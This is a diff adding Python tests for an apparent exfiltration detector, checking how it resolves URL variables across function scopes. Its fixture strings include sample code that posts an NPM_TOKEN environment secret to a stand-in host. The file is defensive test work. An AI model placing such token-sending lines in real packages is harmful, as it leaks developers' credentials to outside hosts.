@@ -97,6 +97,51 @@ class TestPython:
         assert not FlowHelpers.fired(tmp_path, "tests/test_upload.py", body)
 
 
+class TestAUrlIsReadInTheScopeItIsBoundIn:
+    """`url` in one function is not the `url` another function is handed: a parameter's host is not
+    known, and a host a different function wrote down is not its host (`PythonSyntax.name_scope`)."""
+
+    def test_a_parameter_is_not_the_url_another_function_assigned(self, tmp_path) -> None:
+        body = (
+            "import os, requests\n"
+            "def lookup():\n"
+            '    url = "https://m.example.invalid/c"\n'
+            "    return requests.get(url)\n"
+            "def authed(url):\n"
+            '    return requests.get(url, headers={"Authorization": "token " + os.environ["GITHUB_TOKEN"]})\n'
+        )
+        assert not FlowHelpers.fired(tmp_path, "client.py", body)
+
+    def test_a_url_assigned_in_the_same_function_is_judged(self, tmp_path) -> None:
+        body = (
+            "import os, requests\n"
+            "def send():\n"
+            '    url = "https://m.example.invalid/c"\n'
+            '    requests.post(url, data={"t": os.environ["NPM_TOKEN"]})\n'
+        )
+        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)
+
+    def test_a_module_constant_read_in_a_function_is_judged(self, tmp_path) -> None:
+        body = (
+            "import os, requests\n"
+            'URL = "https://m.example.invalid/c"\n'
+            "def send():\n"
+            '    requests.post(URL, data={"t": os.environ["NPM_TOKEN"]})\n'
+        )
+        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)
+
+    def test_a_url_of_the_enclosing_function_is_judged(self, tmp_path) -> None:
+        body = (
+            "import os, requests\n"
+            "def main():\n"
+            '    url = "https://m.example.invalid/c"\n'
+            "    def send():\n"
+            '        requests.post(url, data={"t": os.environ["NPM_TOKEN"]})\n'
+            "    send()\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)
+
+
 class TestJavaScript:
     def test_a_bound_token_in_a_fetch(self, tmp_path) -> None:
         body = (
